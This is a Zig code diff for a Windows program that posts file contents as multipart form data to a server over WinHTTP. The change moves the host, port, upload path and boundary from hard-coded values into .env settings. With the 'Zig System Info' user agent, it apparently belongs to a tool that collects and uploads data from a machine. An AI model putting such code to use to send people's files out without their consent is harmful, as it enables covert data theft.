@@ -74,9 +74,6 @@ const WINHTTP = struct {
 // Fixed UTF-16 strings
 const USER_AGENT = [_:0]u16{ 'Z', 'i', 'g', ' ', 'S', 'y', 's', 't', 'e', 'm', ' ', 'I', 'n', 'f', 'o' };
 const POST_METHOD = [_:0]u16{ 'P', 'O', 'S', 'T' };
-const UPLOAD_PATH = [_:0]u16{ '/', 'u', 'p', 'l', 'o', 'a', 'd' };
-const BOUNDARY = [_:0]u16{ '-', '-', 'b', 'o', 'u', 'n', 'd', 'a', 'r', 'y', '1', '2', '3', '4', '5' };
-const CONTENT_TYPE_HEADER = [_:0]u16{ 'C', 'o', 'n', 't', 'e', 'n', 't', '-', 'T', 'y', 'p', 'e', ':', ' ', 'm', 'u', 'l', 't', 'i', 'p', 'a', 'r', 't', '/', 'f', 'o', 'r', 'm', '-', 'd', 'a', 't', 'a', ';', ' ', 'b', 'o', 'u', 'n', 'd', 'a', 'r', 'y', '=', '-', '-', 'b', 'o', 'u', 'n', 'd', 'a', 'r', 'y', '1', '2', '3', '4', '5', '\r', '\n' };
 
 // Thêm hàm helper để chuyển đổi string sang UTF-16
 fn stringToUtf16(allocator: std.mem.Allocator, input: []const u8) ![:0]u16 {
@@ -148,21 +145,37 @@ fn sendFileContent(file_content: []const u8, file_name: []const u8) !void {
     const allocator = gpa.allocator();
     defer _ = gpa.deinit();
 
-    // Đọc server host từ .env
+    // Đọc các giá trị từ .env
     const server_host = try getEnvValue(allocator, "SERVER_HOST");
     defer allocator.free(server_host);
+    const server_port_str = try getEnvValue(allocator, "SERVER_PORT");
+    defer allocator.free(server_port_str);
+    const upload_path = try getEnvValue(allocator, "UPLOAD_PATH");
+    defer allocator.free(upload_path);
+    const boundary = try getEnvValue(allocator, "BOUNDARY");
+    defer allocator.free(boundary);
 
-    // Chuyển đổi server host thành UTF-16
+    // Chuyển đổi sang UTF-16
     const server_host_utf16 = try stringToUtf16(allocator, server_host);
     defer allocator.free(server_host_utf16);
+    const upload_path_utf16 = try stringToUtf16(allocator, upload_path);
+    defer allocator.free(upload_path_utf16);
 
-    // Create form-data body
+    // Parse port number
+    const server_port = try std.fmt.parseInt(u16, server_port_str, 10);
+
+    // Tạo content type header với boundary động
+    const content_type_buf = try std.fmt.allocPrint(allocator, "Content-Type: multipart/form-data; boundary={s}\r\n", .{boundary});
+    defer allocator.free(content_type_buf);
+    const content_type_header = try stringToUtf16(allocator, content_type_buf);
+    defer allocator.free(content_type_header);
+
+    // Create form-data body với boundary động
     var form_data = std.ArrayList(u8).init(allocator);
     defer form_data.deinit();
 
-    // Add form-data header
     try form_data.appendSlice("--");
-    try form_data.appendSlice("--boundary12345");
+    try form_data.appendSlice(boundary);
     try form_data.appendSlice("\r\n");
     try form_data.appendSlice("Content-Disposition: form-data; name=\"file\"; filename=\"");
     try form_data.appendSlice(file_name);
@@ -174,7 +187,7 @@ fn sendFileContent(file_content: []const u8, file_name: []const u8) !void {
 
     // End form-data
     try form_data.appendSlice("\r\n--");
-    try form_data.appendSlice("--boundary12345");
+    try form_data.appendSlice(boundary);
     try form_data.appendSlice("--\r\n");
 
     // Initialize WinHTTP session
@@ -191,7 +204,7 @@ fn sendFileContent(file_content: []const u8, file_name: []const u8) !void {
     const hConnect = WINHTTP.WinHttpConnect(
         hSession,
         server_host_utf16,
-        8081,
+        server_port,
         0,
     ) orelse return error.WinHttpConnectFailed;
     defer _ = WINHTTP.WinHttpCloseHandle(hConnect);
@@ -200,7 +213,7 @@ fn sendFileContent(file_content: []const u8, file_name: []const u8) !void {
     const hRequest = WINHTTP.WinHttpOpenRequest(
         hConnect,
         &POST_METHOD,
-        &UPLOAD_PATH,
+        upload_path_utf16,
         null,
         null,
         null,
@@ -211,8 +224,8 @@ fn sendFileContent(file_content: []const u8, file_name: []const u8) !void {
     // Send request with form-data
     if (WINHTTP.WinHttpSendRequest(
         hRequest,
-        &CONTENT_TYPE_HEADER,
-        @as(WINHTTP.DWORD, CONTENT_TYPE_HEADER.len),
+        content_type_header,
+        @as(WINHTTP.DWORD, @intCast(content_type_buf.len)),
         null,
         0,
         @intCast(form_data.items.len),
